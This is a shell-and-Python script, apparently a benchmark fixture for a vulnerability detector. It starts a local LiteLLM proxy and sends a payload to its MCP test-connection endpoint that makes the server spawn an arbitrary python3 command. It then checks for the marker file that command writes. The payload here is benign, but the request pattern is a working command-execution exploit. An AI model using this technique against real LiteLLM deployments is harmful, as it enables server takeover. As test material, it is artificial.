#!/bin/bash
#
# LiteLLM MCP stdio command execution benchmark fixture - runner
#
# Starts LiteLLM proxy, sends stdio command-execution payload,
# and verifies file creation inside the container.
# Harmless: only writes to /tmp/litellm_mcp_detector_poc

set -euo pipefail

TARGET_FILE="/tmp/litellm_mcp_detector_poc"
PROXY_URL="http://127.0.0.1:4000"
CONFIG_FILE="/tmp/litellm_proxy_config.yaml"
PROXY_PID=""

cleanup() {
    if [ -n "$PROXY_PID" ] && kill -0 "$PROXY_PID" 2>/dev/null; then
        kill "$PROXY_PID" 2>/dev/null || true
        wait "$PROXY_PID" 2>/dev/null || true
    fi
    rm -f "$CONFIG_FILE"
}
trap cleanup EXIT

# Generate minimal LiteLLM proxy config
cat > "$CONFIG_FILE" << 'EOF'
model_list:
  - model_name: dummy
    litellm_params:
      model: openai/dummy
      api_key: sk-test
      api_base: http://localhost:9999

general_settings:
  master_key: sk-test
  drop_request_timeout: 5
EOF

# Python helper avoids shell quoting nightmares for JSON payload
python3 - << 'PYEOF'
import subprocess
import time
import sys
import os
import socket
import json
import urllib.request
import urllib.error

TARGET_FILE = "/tmp/litellm_mcp_detector_poc"
PROXY_URL = "http://127.0.0.1:4000"
CONFIG_FILE = "/tmp/litellm_proxy_config.yaml"

def print_log_tail():
    try:
        with open("/tmp/litellm_fixture_proxy.log", "r") as lf:
            lines = lf.readlines()
            tail = lines[-20:] if len(lines) > 20 else lines
            print("".join(tail), file=sys.stderr)
    except Exception:
        pass

# Clean up any previous run artifacts
if os.path.exists(TARGET_FILE):
    os.unlink(TARGET_FILE)

# Start LiteLLM proxy
print("[*] Starting LiteLLM proxy on 127.0.0.1:4000...")
log_file = open("/tmp/litellm_fixture_proxy.log", "w")
env = os.environ.copy()
env["LITELLM_MASTER_KEY"] = "sk-test"
proxy_proc = subprocess.Popen(
    ["litellm", "--config", CONFIG_FILE, "--port", "4000"],
    stdout=log_file,
    stderr=subprocess.STDOUT,
    env=env,
)
proxy_pid = proxy_proc.pid

# Wait for proxy to be ready via TCP connect to 127.0.0.1:4000
max_wait = 30
for i in range(max_wait):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        sock.connect(("127.0.0.1", 4000))
        print("[*] Proxy TCP port is ready")
        break
    except OSError:
        if proxy_proc.poll() is not None:
            log_file.close()
            print_log_tail()
            print("[ERROR] Proxy exited unexpectedly", file=sys.stderr)
            sys.exit(1)
        time.sleep(1)
    finally:
        sock.close()
else:
    log_file.close()
    print_log_tail()
    print(f"[ERROR] Proxy did not start within {max_wait}s", file=sys.stderr)
    sys.exit(1)

try:
    # MCP stdio command execution payload
    # The command writes to /tmp inside the container (not host)
    payload = {
        "transport": "stdio",
        "command": "python3",
        "args": ["-c", "open('/tmp/litellm_mcp_detector_poc','w').write('executed')"]
    }

    print("[*] Sending MCP stdio command execution payload...")
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        f"{PROXY_URL}/mcp-rest/test/connection",
        data=data,
        headers={"Content-Type": "application/json", "Authorization": "Bearer sk-test"},
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            _ = resp.read()
            print("[*] Request completed")
    except urllib.error.HTTPError as e:
        # MCP handshake may fail, but what matters is side effect (file creation)
        print(f"[!] HTTP error {e.code} (handshake may have failed, checking side effect...)")
    except urllib.error.URLError as e:
        print(f"[!] URL error: {e.reason} (handshake may have failed, checking side effect...)")

finally:
    # Stop proxy
    print("[*] Stopping proxy...")
    proxy_proc.terminate()
    proxy_proc.wait(timeout=10)
    log_file.close()

# Verify file creation
if os.path.exists(TARGET_FILE):
    with open(TARGET_FILE) as f:
        content = f.read()
    print(f"[*] LITELLM_MCP_POC_FILE_EXISTS=true")
    print(f"[*] File content: {content!r}")
    sys.exit(0)
else:
    print_log_tail()
    print(f"[ERROR] LITELLM_MCP_POC_FILE_EXISTS=false")
    print(f"[ERROR] Target file was not created - stdio command may have been blocked")
    sys.exit(1)
PYEOF

exit $?